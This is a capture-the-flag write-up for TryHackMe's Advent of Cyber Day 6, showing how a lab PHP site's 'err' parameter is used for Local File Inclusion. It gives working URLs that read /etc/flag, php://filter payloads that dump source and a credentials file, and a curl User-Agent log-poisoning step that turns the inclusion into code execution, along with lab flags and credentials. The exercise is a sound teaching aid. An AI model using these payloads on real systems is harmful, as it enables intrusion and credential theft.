---
title:  "TryHackMe: Advent of Cyber - Day 6 - Patch Management is Hard"
date:   2021-12-13 11:00:00 +1000
excerpt: Learning about Local File Inclusion (LFI) Vulnerabilities. 
---

This is a write up for the Day 6 - Patch Management is Hard challenge in the [**Advent of Cyber**](https://tryhackme.com/room/adventofcyber3) room on [TryHackMe](https://tryhackme.com). Some tasks may have been omitted as they do not require an answer.

***

### Deploy the attached VM and look around. What is the entry point for our web application?

When visiting the homepage there is a text while which is loaded via a GET parameter.

<img src="{{ site.baseurl }}/assets/images/2021-12-13-advent-of-cyber-day-6/d6_1.png">

> Answer: **err**

### Use the entry point to perform LFI to read the /etc/flag file. What is the flag?

Changing the parameter to /etc/flag reveals the flag.

```
https://10-10-92-121.p.thmlabs.com/index.php?err=/etc/flag
```

<img src="{{ site.baseurl }}/assets/images/2021-12-13-advent-of-cyber-day-6/d6_2.png">

> Answer: **THM{d29e08941cf7fe41df55f1a7da6c4c06}**

### Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?

The following URL will reveal the base64 encoded version of index.php.

```
https://10-10-92-121.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=index.php
```

Putting the base64 encoded content in a base64 decoder reveals the flag.

<img src="{{ site.baseurl }}/assets/images/2021-12-13-advent-of-cyber-day-6/d6_3.png">

> Answer: **THM{791d43d46018a0d89361dbf60d5d9eb8}**

### Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?

The file path of the credentials is `./includes/creds.php`.

The following URL returns the credentials.

```
https://10-10-92-121.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php
```

Decoding the response provides the following credentials.

<img src="{{ site.baseurl }}/assets/images/2021-12-13-advent-of-cyber-day-6/d6_4.jpg">

> Answer: **McSkidy:A0C315Aw3s0m**

### Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the flag.thm.aoc server? 

We can now attempt to log in at https://10-10-200-251.p.thmlabs.com/login.php

Navigating to the Recover Password page will reveal the password/flag.

<img src="{{ site.baseurl }}/assets/images/2021-12-13-advent-of-cyber-day-6/d6_5.jpg">

> Answer: **THM{552f313b52e3c3dbf5257d8c6db7f6f1}**

### The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log.

Sending a curl request to the server to inject PHP.

```
curl -A "<?php phpinfo();?>" http://10-10-200-251.p.thmlabs.com/login.php
```

Then we can access the logs on the frontend to reveal the PHP info. https://10-10-200-251.p.thmlabs.com/index.php?err=includes/logs/app_access.log

Scrolling down the logs we can see the HOSTNAME of the server.

<img src="{{ site.baseurl }}/assets/images/2021-12-13-advent-of-cyber-day-6/d6_6.jpg">

> Answer: **lfi-aoc-awesome-59aedca683fff9261263bb084880c965**

### Recap

In this task we learnt:
 * How to run LFI on a PHP web server
 